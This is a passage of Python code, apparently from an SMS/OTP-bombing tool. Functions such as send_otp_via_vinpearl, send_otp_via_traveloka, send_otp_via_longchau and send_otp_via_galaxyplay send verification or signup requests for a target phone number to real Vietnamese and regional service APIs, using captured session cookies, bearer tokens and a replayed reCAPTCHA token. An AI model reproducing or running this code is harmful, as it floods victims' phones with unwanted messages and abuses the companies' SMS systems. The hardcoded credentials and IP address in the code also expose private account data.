2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex',
        '__Secure-3PSIDTS': 'sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA',
        '__Secure-3PSIDCC': 'AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-protobuf',
        # 'cookie': '__Secure-3PAPISID=hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf; __Secure-3PSID=g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076; NID=516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex; __Secure-3PSIDTS=sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA; __Secure-3PSIDCC=AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
        'dnt': '1',
        'origin': 'https://www.google.com',
        'priority': 'u=1, i',
        'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'k': '6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT',
    }

    data = '\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bð\x01\x18\x01*>\n\b\b\x01\x10Õ\x01\x18ù\x02\n\b\b\x02\x10¬\x8a\x02\x18:\n\x0e\b\x04\x10ç\x8a\x02\x18ù\x01*\x03\x10¸`\n\b\b\x02\x10¤\x93\x05\x18X\n\x0e\b\x04\x10ý\x93\x05\x18\x96\x01*\x03\x10»n'.encode()

    response = requests.post('https://www.google.com/recaptcha/api2/clr', params=params, cookies=cookies, headers=headers, data=data)


    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA',
        'captchat': '03AFcWeA6FD9EelBdsrVKHbdBJeFirlLDqs6uUyjoSlEpOPu0kW1MpuxZq0WIDH3ZG2BNcm-geCeDFoN_ttxSy_fri8OhUZyNBztp-bQIKX3Nkxy8DTI23SIvXiY4deERRTn648ujmGof9n64xZPqqszck0WxmJDoVR302TlgZRffLW98h06B-G5OxSQazLtC0Sp1BrxwnRxZ8QqY-hFZJs622LIW7iHOdEu-szSTW8zfXKx34bAQULS9zs2LfL7u7V8p1U4TNOjm6oQy1O2L3_i4sZAgUPl64LEKDX5nGwP6G-622G99MlF-jys_iWxxBaGJJjR_XrCRiYy_S2MmHPiR1vmHYU6XhK3d3LemE1vZm5ZTGXT1kaHt6PoqrRYkq7x7BFy8i5_I-e3WhKc4uRF6ZTve35n-iR8TpbuUsWCTX05ofVz6HTliRwcH_UITx4CHovH51Fuf0ko9Q5PFdevOieOLMIH-txiPmaFbTEdo-7lXQ8uOvilc5Q7lMSKMIPqwKW73NEtUHgX56vCv6stbOIUeTp83n3oDcTi33WBnQhtPbqt2CXdmheoPB8bXy0tNPE4hsNTXEgdegwPzgZVe5Mt_m_AdTJYj9tZTi6NHKbzMytlt8LVhVW9PQyvaH6RyDznWp4sP5ggOQTwdy6CRieWf5S10IxlgEAI2Jfx43OxrWA_bc4X6F4JxOBSE7feyIbXDHpOQYNa7rMwrPbELE9YQVJS6RlUPOAnol0_qb0ez6Ajx-rF8QzBKphGaiOJsqYfADpVQluBkQVrLsGFUbh_XlvI8TUtfJzNKOFe7o0rXqOjfdVC8uRqPZY1fbS9QT7TlJVfXdfDBKlHLw3E5plm3-5zZIAyDMQFr8GJLgRgnsCAp3Qf0im-wjRQSONR1MwBumNho2MH039zwiDgVWc50BqFiCvhhsSdxhz_gMjAjvM_TDawV8PyAxesgrDRKzrUA3A4qFYxDK8dPKOd5MQt6wGn7ZmmbkLC2cfBK5P7AKiMynlHm07P_b_T1eCyDl_NvcVsGF9p9OlE1jx7pkqIf2dT6ZLIS467Sk_XgjbG4hZy17520iK6AntQheXkfyhKxAEUrL06_VlU0cpSupjCw2tlaAMMefkZOxZYP0g9LHKMe2DgT5hPwyJAXwbUlQagul4_mI2aWnxRh4Nzrpweqa8QrM2HpVxZtkrBGYko5lmw3-fiUTvsA-QzX6MVf_q1Ltzw8Un-YdZTEIM0ZxZkTvAdpYyDKSrjR9ZVOjHK7qFhM0VdtmiUXHccTsrv88Y_UJbDkOaHHf7GfcwPBnwDdflVRKsllc2rRTpxdNI-ZwnDBHW0_2t2q8XPR0sTNea_cAl8Luvf95e--WWkVN70MUXq9a5ruwzFRvMS8EHz1VIicMd3OloLnO0zdOZ-bcifucDJD1MSJ_lCj1KdSs4Uh5YYv2iLdd_F5xS8_rupL4_2mtE3t4YXqwqmGMRkIUriEtCT9KwT9YSR2JMeBRPMm9LAyiWvNhMb4GNE0wYgKpWMtFGk0n7vUL2d4C_HXvm4HYecb56mPFqOlfUVxFVnuyHVRIDZXcGgQpPnbck3Gj-hM859anXjlkTQS_iEFkgv1odXZw0W6I9HxkXaAzsfPQF-sZAQsG1a2AeS_9tt9fuZdSz5_0L2Mdwd-Nx8laf77R6pr2G4AwoaLxc3v6PfS9lUh5L5DprhCUftJVWcbr4x_SBeIl_cv_E0wE1TP0kp-ZlMZ0ENFnDebQiGabeVZMIhpNIXT9Z_G5LOGKr5UOCkIWUsisZH1WPz0bXfEKYB2VxQVzcJe0kAoJj_71CRkeWFdLxGiC0hhorobwC0gx5GXkb_kBKrCxKzpE4FVANQIBUrbsx3a5enmbdd06UUrnfHQstTUE_YSLkUY1iZvMqHUM3gG74mhS71c0-BcEMisBfAI_UiLKaBTUdS_nOMW8f8QsN4AZxO_Es67NDYIy65fv-s3aXyo2J5EFo3pBfSDFhpZR',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://spacet.vn',
        'priority': 'u=1, i',
        'referer': 'https://spacet.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://api.spacet.vn/www/user/phone', headers=headers, json=json_data)
    
def send_otp_via_vinpearl(sdt):


    cookies = {
        '__cf_bm': 'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
        '__cfruid': '3f11778af16256a63eb265af0f726daceeb866de-1722350965',
    }

    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': '__cf_bm=ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw; __cfruid=3f11778af16256a63eb265af0f726daceeb866de-1722350965',
        'dnt': '1',
        'priority': 'i',
        'referer': 'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    response = requests.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', cookies=cookies, headers=headers)


    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://booking.vinpearl.com',
        'priority': 'u=1, i',
        'referer': 'https://booking.vinpearl.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-display-currency': 'VND',
    }

    json_data = {
        'channel': 'vpt',
        'username': sdt,
        'type': 1,
        'OtpChannel': 1,
    }

    response = requests.post(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=headers,
        json=json_data,
    )

    

def send_otp_via_traveloka(sdt):
    # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]

    cookies = {
        'tv-repeat-visit': 'true',
        'countryCode': 'VN',
        'tv_user': '{"authorizationLevel":100,"id":null}',
        'aws-waf-token': '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
        'tvl': 'Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy',
        'tvs': 'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
        '_dd_s': 'rum=0&expire=1722352252222&logs=1&id=a1a90fe7-fce8-48b0-9100-5f789ab941af&created=1722351314461',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.traveloka.com',
        'priority': 'u=1, i',
        'referer': 'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-domain': 'user',
        'x-route-prefix': 'vi-vn',
    }

    json_data = {
        'fields': [],
        'data': {
            'userLoginMethod': 'PN',
            'username': sdt,
        },
        'clientInterface': 'desktop',
    }

    response = requests.post('https://www.traveloka.com/api/v2/user/signup', cookies=cookies, headers=headers, json=json_data)
    



def send_otp_via_dongplus(sdt):


    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'ert': 'DP:f9adae3150090780ee8cfac00fc7cc13',
        'origin': 'https://dongplus.vn',
        'priority': 'u=1, i',
        'referer': 'https://dongplus.vn/user/registration/reg1',
        'rt': '2024-07-30T22:25:19+07:00',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'mobile_phone': sdt,
    }

    response = requests.post('https://api.dongplus.vn/api/v2/user/check-phone', headers=headers, json=json_data)
    

def send_otp_via_longchau(sdt):


    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
    
def send_otp_via_longchau1(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
    
def send_otp_via_galaxyplay(sdt):

    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'content-length': '0',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    response = requests.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, headers=headers)
    
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'app_category': 'app',
        'app_version': '2.0.0',
        'app_env': 'prod',
        'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
        'client_ip': '14.170.8.116',
        'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'client_timestamp': '1722356171541',
        'model_name': 'Windows',
        'user_id': '',
        'client_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'event_category': 'account',
        'on_screen': 'login',
        'from_screen': 'landing_page',
        'event_action': 'click',
        'direct_object_type': 'button',
        'direct_object_id': 'submit_phone_number',
        'direct_object_property': sdt,
        'indirect_object_type': '',
        'indirect_object_id': '',
        'indirect_object_property': '',
        'context_format': '',
        'profile_id': '',
        'profile_name': '',
        'profile_kid_mode': '0',
        'context_value': {
            'is_new_user': 1,
            'new_lp': 0,
            'testing_tag': [],
        },
        'mkt_source': '',
        'mkt_campaign': '',
        'mkt_medium': '',
        'mkt_term': '',
        'mkt_content': '',
    }

    response = requests.post('https://tracker.glxplay.io/v1/event', headers=headers, json=json_data)
		
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'content-length': '0',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
